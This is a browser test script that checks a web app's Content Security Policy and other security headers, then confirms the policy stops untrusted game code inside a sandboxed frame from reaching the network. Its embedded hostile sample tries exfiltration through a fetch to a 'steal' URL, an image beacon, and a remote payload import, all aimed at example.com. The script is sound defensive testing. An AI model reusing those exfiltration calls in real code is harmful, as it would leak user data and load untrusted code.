// Checks the production headers, then runs the full e2e suite under them.
//
// Two things are being proved. First, that the CSP does not break the app --
// Brotli is WebAssembly and the compiler is a worker, both of which a careless
// policy kills outright. Second, that the policy actually reaches the game
// frame: a srcdoc document inherits its parent's CSP, and because the frame is
// sandboxed to an opaque origin, every `'self'` in that inherited policy
// matches nothing. That is what denies untrusted game code the network.
//
// The probe asserts on the violation reports the browser logs, not merely on
// the requests having failed: on a machine with no outbound network everything
// fails anyway, so "it did not load" is no evidence at all. A violation report
// naming the directive is the browser stating the cause.

import { spawn } from 'node:child_process'
import { readdir } from 'node:fs/promises'
import { fileURLToPath } from 'node:url'
import { chromium } from 'playwright'
import { serve } from './serve-dist.mjs'

let failures = 0
const check = (name, pass, detail = '') => {
  console.log(`  ${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? '  — ' + detail : ''}`)
  if (!pass) failures++
}

// Asset names are content-hashed, so nothing may hard-code them.
const assets = await readdir(fileURLToPath(new URL('../dist/assets/', import.meta.url)))
const asset = (re) => '/assets/' + assets.find((f) => re.test(f))

const withHeaders = await serve({ port: 5180 })
console.log(`serving dist/ under public/_headers at ${withHeaders.origin}\n`)

// --------------------------------------------------------------- wire ---

console.log('=== Headers on the wire ===')

for (const path of ['/', '/play/']) {
  const res = await fetch(withHeaders.origin + path)
  const csp = res.headers.get('content-security-policy') ?? ''
  check(`${path} sends a CSP`, csp.includes("default-src 'self'"))
  check(`${path} confines the network`, csp.includes("connect-src 'self'"))
  check(`${path} permits wasm`, csp.includes("'wasm-unsafe-eval'"))
  check(`${path} forbids objects`, csp.includes("object-src 'none'"))
  check(`${path} denies framing`, res.headers.get('x-frame-options') === 'DENY')
  check(`${path} sends nosniff`, res.headers.get('x-content-type-options') === 'nosniff')
  check(`${path} sends no referrer`, res.headers.get('referrer-policy') === 'no-referrer')
}

const wasm = await fetch(withHeaders.origin + asset(/brotli_dec_wasm_bg.*\.wasm$/))
check(
  'wasm is served as application/wasm',
  wasm.headers.get('content-type') === 'application/wasm',
  wasm.headers.get('content-type') ?? 'missing',
)
check(
  'assets are immutably cached',
  (await fetch(withHeaders.origin + asset(/^create-.*\.js$/))).headers
    .get('cache-control')
    ?.includes('immutable') === true,
)
check(
  'the HTML entry point is not immutably cached',
  !(await fetch(withHeaders.origin + '/')).headers.get('cache-control')?.includes('immutable'),
)

// ------------------------------------------------------------- browser ---

const browser = await chromium.launch({
  headless: process.env.HEADED !== '1',
  channel: process.env.HEADED === '1' ? 'chrome' : undefined,
})

// A game that tries every exfiltration channel the sandbox attribute alone
// leaves open, then reports which ones worked.
const HOSTILE = `
var out = { ran: false, fetched: null, beacon: null, imported: null }
setup = () => { out.ran = true }
draw = () => { clear('#002') }

fetch('https://example.com/steal?x=1', { mode: 'no-cors' })
  .then(function () { out.fetched = true })
  .catch(function () { out.fetched = false })

var img = new Image()
img.onload = function () { out.beacon = true }
img.onerror = function () { out.beacon = false }
img.src = 'https://example.com/pixel.gif?x=1'

import('https://example.com/payload.js')
  .then(function () { out.imported = true })
  .catch(function () { out.imported = false })

setTimeout(function () { parent.postMessage({ __probe: 1, out: out }, '*') }, 3000)
`

/**
 * Types the hostile game into the real editor and lets the real preview mount
 * it, so the frame under test is built by the app rather than by this script.
 */
async function runProbe(ctx, origin) {
  const page = await ctx.newPage()
  await page.goto(origin + '/', { waitUntil: 'domcontentloaded' })
  await page.waitForSelector('.cm-content', { timeout: 60000 })

  await page.evaluate(() => {
    window.__probe = new Promise((resolve) => {
      addEventListener('message', (e) => {
        if (e.data && e.data.__probe === 1) resolve(e.data.out)
      })
    })
  })

  await page.click('.cm-content')
  await page.keyboard.press('Control+A')
  await page.keyboard.insertText(HOSTILE)

  const out = await page.evaluate(() =>
    Promise.race([window.__probe, new Promise((r) => setTimeout(() => r(null), 20000))]),
  )
  return { page, out }
}

// --------------------------------------------------- app under the policy ---

const ctx = await browser.newContext({ viewport: { width: 1280, height: 860 } })
const violations = []
ctx.on('page', (p) => {
  p.on('console', (m) => {
    const t = m.text()
    if (/Content Security Policy|Refused to/i.test(t)) violations.push(t)
  })
})

console.log('\n=== Create page under the policy ===')
const page = await ctx.newPage()
await page.goto(withHeaders.origin + '/', { waitUntil: 'domcontentloaded' })

// A QR canvas only appears if the worker started, Terser ran and Brotli
// compiled -- the whole expensive path, every part of which a CSP can break.
await page.waitForSelector('#qr-holder canvas', { timeout: 90000 }).catch(() => {})
const created = await page.evaluate(() => ({
  qr: !!document.querySelector('#qr-holder canvas'),
  symbol: document.getElementById('stat-symbol')?.textContent?.replace(/\s+/g, ' ').trim(),
  problems: [...document.querySelectorAll('.problem')].map((n) => n.innerText),
  editor: !!document.querySelector('.cm-editor'),
}))
check('worker + Terser + Brotli survived the CSP', created.qr, created.symbol ?? 'no symbol')
check('no compile problems', created.problems.length === 0, created.problems.join(' | '))
check('CodeMirror mounted and styled itself', created.editor)
await page.close()

// ----------------------------------------- the policy inside a game frame ---

console.log('\n=== What a hostile game can reach ===')

const { out } = await runProbe(ctx, withHeaders.origin)
console.log(`  the game reported: ${JSON.stringify(out)}`)

// The browser naming the directive is the causal evidence. "The request
// failed" would not be: with no outbound network, it fails either way.
const blockedBy = (directive) =>
  violations.some((v) => v.includes(directive) && v.includes('example.com'))

if (!out) {
  check('hostile game reported back', false, 'no message received from the frame')
} else {
  check('the game itself still runs under the policy', out.ran === true)
  check('fetch to a third party blocked by connect-src', blockedBy("connect-src 'self'"))
  check('image-URL beacon blocked by img-src', blockedBy('img-src'))
  check('remote import() blocked by script-src', blockedBy('script-src'))
  check(
    'the game observed all three failing',
    out.fetched === false && out.beacon === false && out.imported === false,
    JSON.stringify(out),
  )
}

console.log(`\n  CSP violations the browser logged: ${violations.length}`)
for (const v of [...new Set(violations)].slice(0, 10)) console.log(`    ${v.slice(0, 160)}`)

await browser.close()

// -------------------------------------------------------- full e2e suite ---

console.log('\n=== Full e2e suite against the policied origin ===\n')
const e2e = fileURLToPath(new URL('./e2e.mjs', import.meta.url))
const code = await new Promise((resolve) => {
  spawn(process.execPath, [e2e], {
    stdio: 'inherit',
    env: { ...process.env, BASE: withHeaders.origin },
  }).on('exit', resolve)
})
if (code !== 0) failures++

await withHeaders.close()

console.log(failures ? `\n${failures} HEADER CHECK(S) FAILED` : '\nALL HEADER CHECKS PASSED')
process.exit(failures ? 1 : 0)
